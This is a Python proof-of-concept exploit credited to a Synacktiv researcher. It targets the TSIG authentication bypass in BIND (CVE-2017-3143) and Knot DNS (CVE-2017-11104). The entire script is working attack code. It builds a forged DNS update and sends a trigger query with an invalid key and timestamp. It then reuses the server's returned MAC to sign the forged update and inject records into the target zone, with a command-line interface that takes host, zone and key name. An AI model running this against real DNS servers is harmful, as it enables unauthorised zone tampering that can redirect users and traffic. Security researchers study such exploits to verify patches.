# Clement Berthaux - Synacktiv
# Exploit for CVE-2017-3143 (Bind) and CVE-2017-11104 (Knot-dns)

import dns.query
import dns.zone
import dns.tsigkeyring
import dns.tsig
import dns.message
import dns.update
from time import time, sleep
from struct import pack

def get_forged(zone, sz):
	req = dns.update.Update(zone)
	
	# update this with whatever change you want to do
	# req.delete('i.can.inject.records.in.the.zone', 'txt')
	req.add('i.can.inject.records.in.the.zone', 3600, 'txt', 'injected')

	# padding needed to absorb the appended answer data
	req.delete('padding', 'txt')
	req.add('padding', 3600, 'txt', '\x00'*sz)
	return req

def exploit(host, zone, key_name):
	keyring = dns.tsigkeyring.from_text({
		key_name : 'whateverwrongkey'.encode('base64')
	})
	origin = dns.name.from_text(zone)
	
	sz = 12+sum(len(e)+1 for e in (zone).split('.'))+1+4
	fudge = 300

	forged = get_forged(zone, sz)
	dns.query.udp(forged, host)
	
	# get forged data and strip the last sz bytes of padding data
	forged_data = forged.to_wire()
	forged_data = forged_data[2:-sz]
	
	forged.id = len(forged_data)

	print '[+] generated forged request'

	# For some reasons triggering a TSIG BADTIME error doesn't seem to be logged by Knot
	trigger = dns.message.make_query(zone, dns.rdatatype.A)
	trigger.use_tsig(keyring, keyname=key_name, algorithm=dns.tsig.HMAC_SHA256)
	
	t = time()
	ts = time()+fudge+1

	# set timestamp out of valid time window
	trigger.time_func = lambda:ts

	# alter trigger digest
	trigger.request_hmac = forged_data

	
	print '[+] sending trigger with forged digest'

	ans = dns.query.tcp(trigger, host, origin=origin)

	if not ans.mac:
		print '[-] couldnt get mac from answer, probably got TSIG_BAD_KEY but dnspython is too bad to populate the tsig_error attribute'
		return

	# add TSIG record
	forged.use_tsig(keyring, keyname=key_name, original_id=forged.id, algorithm=dns.tsig.HMAC_SHA256)

	# use the same ts which should now be valid
	forged.time_func = lambda: ts

	# replace digest
	forged.request_hmac = ans.mac

	# set TSIG error because it's part of the digest
	forged.tsig_error = 0x12
	forged.other_data = '\x00\x00'+pack('>I', int(t))
	
	print '[+] signed request mac is %s' % ans.mac.encode('hex')

	forged.id = len(trigger.request_hmac)

	print '[+] waiting for signature validity'

	sleep(2)

	# patch additionnal_record_count in padding data
	data = ans.to_wire()[:11]+'\x00'+ans.to_wire()[12:sz]
	
	forged.authority[-1][0].strings[0] = data

	print '[+] sending forged update'
	p = dns.query.udp(forged, host)
	if p.rcode():
		print '[-] update failed, got errcode %d' % p.rcode()
		return

	print '[+] zone updated !'

	
if __name__ == '__main__':
	
	from argparse import ArgumentParser

	p = ArgumentParser()
	p.add_argument('host')
	p.add_argument('zone')
	p.add_argument('keyname')

	o = p.parse_args()
	
	exploit(o.host, o.zone, o.keyname)
